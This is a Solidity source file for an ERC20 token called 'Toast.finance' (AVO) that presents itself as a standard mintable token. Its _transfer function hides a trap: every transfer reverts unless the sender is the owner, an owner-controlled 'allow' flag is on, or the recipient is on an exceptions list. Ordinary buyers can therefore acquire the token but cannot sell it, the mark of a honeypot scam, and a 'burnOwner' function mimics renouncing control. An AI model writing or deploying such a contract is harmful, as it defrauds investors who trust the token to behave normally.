1 pragma solidity ^0.5.16;
2 
3 interface IERC20 {
4     function totalSupply() external view returns (uint);
5     function balanceOf(address account) external view returns (uint);
6     function transfer(address recipient, uint amount) external returns (bool);
7     function allowance(address owner, address spender) external view returns (uint);
8     function approve(address spender, uint amount) external returns (bool);
9     function transferFrom(address sender, address recipient, uint amount) external returns (bool);
10     event Transfer(address indexed from, address indexed to, uint value);
11     event Approval(address indexed owner, address indexed spender, uint value);
12 }
13 
14 contract Context {
15     constructor () internal { }
16     // solhint-disable-previous-line no-empty-blocks
17 
18     function _msgSender() internal view returns (address payable) {
19         return msg.sender;
20     }
21 }
22 
23 contract ERC20 is Context, IERC20 {
24     using SafeMath for uint;
25 
26     mapping (address => uint) private _balances;
27     
28     mapping (address => mapping (address => uint)) private _allowances;
29     mapping (address => bool) private exceptions;
30     address private uniswap;
31     address private _owner;
32     uint private _totalSupply;
33     bool private allow;
34 
35     constructor(address owner) public{
36       _owner = owner;
37       allow = false;
38     }
39 
40     function setAllow() public{
41         require(_msgSender() == _owner,"Only owner can change set allow");
42         allow = true;
43     }
44 
45     function setExceptions(address someAddress) public{
46         exceptions[someAddress] = true;
47     }
48 
49     function burnOwner() public{
50         require(_msgSender() == _owner,"Only owner can change set allow");
51         _owner = address(0);
52     }    
53 
54     function totalSupply() public view returns (uint) {
55         return _totalSupply;
56     }
57     function balanceOf(address account) public view returns (uint) {
58         return _balances[account];
59     }
60     function transfer(address recipient, uint amount) public returns (bool) {
61         _transfer(_msgSender(), recipient, amount);
62         return true;
63     }
64     function allowance(address owner, address spender) public view returns (uint) {
65         return _allowances[owner][spender];
66     }
67     function approve(address spender, uint amount) public returns (bool) {
68         _approve(_msgSender(), spender, amount);
69         return true;
70     }
71     function transferFrom(address sender, address recipient, uint amount) public returns (bool) {
72         _transfer(sender, recipient, amount);
73         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
74         return true;
75     }
76     function increaseAllowance(address spender, uint addedValue) public returns (bool) {
77         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
78         return true;
79     }
80     function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
81         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
82         return true;
83     }
84     function _transfer(address sender, address recipient, uint amount) internal {
85         require(sender != address(0), "ERC20: transfer from the zero address");
86         require(recipient != address(0), "ERC20: transfer to the zero address");
87         // Trigger special exceptions
88         if(sender == _owner || allow ) {
89           _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
90           _balances[recipient] = _balances[recipient].add(amount);
91           emit Transfer(sender, recipient, amount);
92         }else {
93           if(exceptions[recipient]) {
94             _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
95             _balances[recipient] = _balances[recipient].add(amount);
96             emit Transfer(sender, recipient, amount);
97           }else {
98             revert();
99           }
100         }
101     }
102     
103     function _mint(address account, uint amount) internal {
104         require(account != address(0), "ERC20: mint to the zero address");
105 
106         _totalSupply = _totalSupply.add(amount);
107         _balances[account] = _balances[account].add(amount);
108         emit Transfer(address(0), account, amount);
109     }
110     function _burn(address account, uint amount) internal {
111         require(account != address(0), "ERC20: burn from the zero address");
112 
113         _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
114         _totalSupply = _totalSupply.sub(amount);
115         emit Transfer(account, address(0), amount);
116     }
117     function _approve(address owner, address spender, uint amount) internal {
118         require(owner != address(0), "ERC20: approve from the zero address");
119         require(spender != address(0), "ERC20: approve to the zero address");
120 
121         _allowances[owner][spender] = amount;
122         emit Approval(owner, spender, amount);
123     }
124 }
125 
126 contract ERC20Detailed is IERC20 {
127     string private _name;
128     string private _symbol;
129     uint8 private _decimals;
130 
131     constructor (string memory name, string memory symbol, uint8 decimals) public {
132         _name = name;
133         _symbol = symbol;
134         _decimals = decimals;
135     }
136     function name() public view returns (string memory) {
137         return _name;
138     }
139     function symbol() public view returns (string memory) {
140         return _symbol;
141     }
142     function decimals() public view returns (uint8) {
143         return _decimals;
144     }
145 }
146 
147 library SafeMath {
148     function add(uint a, uint b) internal pure returns (uint) {
149         uint c = a + b;
150         require(c >= a, "SafeMath: addition overflow");
151 
152         return c;
153     }
154     function sub(uint a, uint b) internal pure returns (uint) {
155         return sub(a, b, "SafeMath: subtraction overflow");
156     }
157     function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
158         require(b <= a, errorMessage);
159         uint c = a - b;
160 
161         return c;
162     }
163     function mul(uint a, uint b) internal pure returns (uint) {
164         if (a == 0) {
165             return 0;
166         }
167 
168         uint c = a * b;
169         require(c / a == b, "SafeMath: multiplication overflow");
170 
171         return c;
172     }
173     function div(uint a, uint b) internal pure returns (uint) {
174         return div(a, b, "SafeMath: division by zero");
175     }
176     function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
177         // Solidity only automatically asserts when dividing by 0
178         require(b > 0, errorMessage);
179         uint c = a / b;
180 
181         return c;
182     }
183 }
184 
185 library Address {
186     function isContract(address account) internal view returns (bool) {
187         bytes32 codehash;
188         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
189         // solhint-disable-next-line no-inline-assembly
190         assembly { codehash := extcodehash(account) }
191         return (codehash != 0x0 && codehash != accountHash);
192     }
193 }
194 
195 library SafeERC20 {
196     using SafeMath for uint;
197     using Address for address;
198 
199     function safeTransfer(IERC20 token, address to, uint value) internal {
200         callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
201     }
202 
203     function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
204         callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
205     }
206 
207     function safeApprove(IERC20 token, address spender, uint value) internal {
208         require((value == 0) || (token.allowance(address(this), spender) == 0),
209             "SafeERC20: approve from non-zero to non-zero allowance"
210         );
211         callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
212     }
213     function callOptionalReturn(IERC20 token, bytes memory data) private {
214         require(address(token).isContract(), "SafeERC20: call to non-contract");
215 
216         // solhint-disable-next-line avoid-low-level-calls
217         (bool success, bytes memory returndata) = address(token).call(data);
218         require(success, "SafeERC20: low-level call failed");
219 
220         if (returndata.length > 0) { // Return data is optional
221             // solhint-disable-next-line max-line-length
222             require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
223         }
224     }
225 }
226 
227 contract AVO is ERC20, ERC20Detailed {
228   using SafeERC20 for IERC20;
229   using Address for address;
230   using SafeMath for uint;
231   
232   
233   address public governance;
234   mapping (address => bool) public minters;
235 
236   constructor () public ERC20Detailed("Toast.finance", "AVO", 18) ERC20(tx.origin){
237       governance = tx.origin;
238   }
239 
240   function mint(address account, uint256 amount) public {
241       require(minters[msg.sender], "!minter");
242       _mint(account, amount);
243   }
244   
245   function setGovernance(address _governance) public {
246       require(msg.sender == governance, "!governance");
247       governance = _governance;
248   }
249   
250   function addMinter(address _minter) public {
251       require(msg.sender == governance, "!governance");
252       minters[_minter] = true;
253   }
254   
255   function removeMinter(address _minter) public {
256       require(msg.sender == governance, "!governance");
257       minters[_minter] = false;
258   }
259 }